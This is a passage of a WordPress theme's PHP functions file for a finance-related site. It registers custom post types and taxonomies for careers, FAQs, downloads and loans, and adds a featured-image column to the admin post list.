        'rewrite'            => array( 'slug' => 'slidertext' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title','custom-fields'),
    );
 
    register_post_type( 'slidertext', $args );
}
 
add_action( 'init', 'slidertext_init' );

function goodthing_init() {
    $labels = array(
        'name'                  => _x( 'Good Thing', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Good Thing', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Good Thing', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Good Thing', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Good Thing', 'RealIndianMoney' ),
        'new_item'              => __( 'New Good Thing', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Good Thing', 'RealIndianMoney' ),
        'view_item'             => __( 'View Good Thing', 'RealIndianMoney' ),
        'all_items'             => __( 'All Good Thing', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Good Thing', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Good Thing:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Good Thing found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Good Thing found in Trash.', 'RealIndianMoney' ),
        'featured_image'        => _x( 'Good Thing Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Good Thing', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Good Thing', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Good Thing list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Good Thing list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Good Thing list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'goodthing' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor', 'author', 'thumbnail'),
    );
 
    register_post_type( 'goodthing', $args );
}
 
add_action( 'init', 'goodthing_init' );

function career_init() {
    $labels = array(
        'name'                  => _x( 'Career', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Career', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Career', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Career', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Career', 'RealIndianMoney' ),
        'new_item'              => __( 'New Career', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Career', 'RealIndianMoney' ),
        'view_item'             => __( 'View Career', 'RealIndianMoney' ),
        'all_items'             => __( 'All Career', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Career', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Career:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Career found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Career found in Trash.', 'RealIndianMoney' ),
        'featured_image'        => _x( 'Career Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Career', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Career', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Career list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Career list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Career list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'career' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor', 'author','custom-fields'),
    );
 
    register_post_type( 'career', $args );
}
 
add_action( 'init', 'career_init' );



add_filter('manage_posts_columns', 'ST4_columns_head');
add_action('manage_posts_custom_column', 'ST4_columns_content', 10, 2);
// GET FEATURED IMAGE
function ST4_get_featured_image($post_ID) {
    $post_thumbnail_id = get_post_thumbnail_id($post_ID);
    if ($post_thumbnail_id) {
        $post_thumbnail_img = wp_get_attachment_image_src($post_thumbnail_id, 'featured_preview');
        return $post_thumbnail_img[0];
    }
}

// ADD NEW COLUMN
function ST4_columns_head($defaults) {
	$defaults['featured_image'] = 'Featured Image';
    return $defaults;
}
 
// SHOW THE FEATURED IMAGE
function ST4_columns_content($column_name, $post_ID) {
	//print_r($column_name);die;
    if ($column_name == 'featured_image') {
        $post_featured_image = ST4_get_featured_image($post_ID);
        if ($post_featured_image) {
            // HAS A FEATURED IMAGE
            echo '<img src="' . $post_featured_image . '" style="height:55px" />';
        }
        else {
            // NO FEATURED IMAGE, SHOW THE DEFAULT ONE
            echo '<img src="'. get_bloginfo( 'template_url' ).'/images/default.png"   style="height:20px" />';
        }
    }
}

if (class_exists('MultiPostThumbnails')) {
    new MultiPostThumbnails(array(
        'label' => 'Banner Image',
        'id' => 'feature-image-2',
        'post_type' => 'page'
        )
    );
	new MultiPostThumbnails(array(
        'label' => 'Banner Image',
        'id' => 'feature-image-2',
        'post_type' => 'post'
        )
    );
};


function faqs_init() {
    $labels = array(
        'name'                  => _x( 'FAQ', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'FAQ', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'FAQ', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'FAQ', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New FAQ', 'RealIndianMoney' ),
        'new_item'              => __( 'New FAQ', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit FAQ', 'RealIndianMoney' ),
        'view_item'             => __( 'View FAQ', 'RealIndianMoney' ),
        'all_items'             => __( 'All FAQ', 'RealIndianMoney' ),
        'search_items'          => __( 'Search FAQ', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent FAQ:', 'RealIndianMoney' ),
        'not_found'             => __( 'No FAQ found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No FAQ found in Trash.', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into FAQ', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this FAQ', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter FAQ list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'FAQ list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'FAQ list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'faqs' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor'),
    );
 
    register_post_type( 'faqs', $args );
}
 
add_action( 'init', 'faqs_init' );

function faq_init() {
    // create a new taxonomy
    register_taxonomy(
        'faqs_cat',
        'faqs',
         array(
            'labels' => array(
                'name' => 'Category',
                'add_new_item' => 'Add New Category FAQ',
                'new_item_name' => "New Category Type FAQ"
            ),
            'show_ui' => true,
            'show_tagcloud' => false,
            'hierarchical' => true)
    );
}
add_action( 'init', 'faq_init' );

function download_init() {
    $labels = array(
        'name'                  => _x( 'Download', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Download', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Download', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Download', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Download', 'RealIndianMoney' ),
        'new_item'              => __( 'New Download', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Download', 'RealIndianMoney' ),
        'view_item'             => __( 'View Download', 'RealIndianMoney' ),
        'all_items'             => __( 'All Download', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Download', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Download:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Download found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Download found in Trash.', 'RealIndianMoney' ),
        'archives'              => _x( 'Download archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Download', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Download', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter FAQ list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Download list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Download list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'download' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor'),
    );
 
    register_post_type( 'download', $args );
}
 
add_action( 'init', 'download_init' );

function download_cat_init() {
    // create a new taxonomy
    register_taxonomy(
        'download_cat',
        'download',
         array(
            'labels' => array(
                'name' => 'Download Category',
                'add_new_item' => 'Add New Download Category FAQ',
                'new_item_name' => "New Download Category Type FAQ"
            ),
            'show_ui' => true,
            'show_tagcloud' => false,
            'hierarchical' => true)
    );
}
add_action( 'init', 'download_cat_init' );

function loan_init() {
    $labels = array(
        'name'                  => _x( 'Loan', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Loan', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Loan', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Loan', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Loan', 'RealIndianMoney' ),
        'new_item'              => __( 'New Loan', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Loan', 'RealIndianMoney' ),
        'view_item'             => __( 'View Loan', 'RealIndianMoney' ),
        'all_items'             => __( 'All Loan', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Loan', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Loan:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Loan found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Loan found in Trash.', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Loan', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Loan', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Loan list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Loan list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Loan list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'loan' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor'),
    );
 
    register_post_type( 'loan', $args );
}
 
add_action( 'init', 'loan_init' );

function loans_init() {
    // create a new taxonomy
    register_taxonomy(
        'loan_cat',
        'loan',
         array(
            'labels' => array(
                'name' => 'Category',
                'add_new_item' => 'Add New Category Loan',
                'new_item_name' => "New Category Type Loan"
            ),
            'show_ui' => true,
            'show_tagcloud' => false,
            'hierarchical' => true)
    );
}
add_action( 'init', 'loans_init' );